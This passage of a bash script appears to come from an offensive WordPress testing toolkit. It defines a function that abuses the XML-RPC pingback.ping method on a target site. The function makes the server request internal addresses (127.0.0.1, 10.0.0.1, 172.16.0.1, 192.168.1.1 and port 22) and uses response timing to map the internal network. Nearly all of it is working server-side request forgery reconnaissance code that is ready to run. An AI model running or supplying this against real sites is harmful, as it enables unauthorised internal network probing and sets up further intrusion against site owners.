}

bt_183_wp_pingback_internal_recon() {
    local target="${1:-$TARGET}"
    _section "[BT-183] PINGBACK INTERNAL NETWORK RECONNAISSANCE"
    run "Using pingback response timing for internal network mapping..."
    > "$SESSION/bt/wp_pingback_recon.txt"
    # Common internal IP patterns
    local internal_ips=("127.0.0.1" "10.0.0.1" "172.16.0.1" "192.168.1.1")
    for ip in "${internal_ips[@]}"; do
        local start=$(date +%s%N)
        local resp=$(curl -sk --max-time 10 -X POST "https://${target}/xmlrpc.php" -H "Content-Type: text/xml" -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://${ip}:80/</string></value></param><param><value><string>https://${target}/</string></value></param></params></methodCall>" 2>/dev/null)
        local end=$(date +%s%N)
        local dur=$(( (end - start) / 1000000 ))
        local fault=$(echo "$resp" | grep -oP '(?<=<string>)[^<]+' | head -1)
        echo "${ip}:80 -> ${dur}ms — $fault" >> "$SESSION/bt/wp_pingback_recon.txt"
    done
    # Test protocol variations
    for proto in "http" "https" "ftp"; do
        local start=$(date +%s%N)
        local resp=$(curl -sk --max-time 8 -X POST "https://${target}/xmlrpc.php" -H "Content-Type: text/xml" -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>${proto}://127.0.0.1:22/</string></value></param><param><value><string>https://${target}/</string></value></param></params></methodCall>" 2>/dev/null)
        local end=$(date +%s%N)
        local dur=$(( (end - start) / 1000000 ))
        echo "${proto}://127.0.0.1:22 -> ${dur}ms" >> "$SESSION/bt/wp_pingback_recon.txt"
    done
    [ -s "$SESSION/bt/wp_pingback_recon.txt" ] && bt "Pingback internal recon complete" || info "Pingback recon minimal"
}

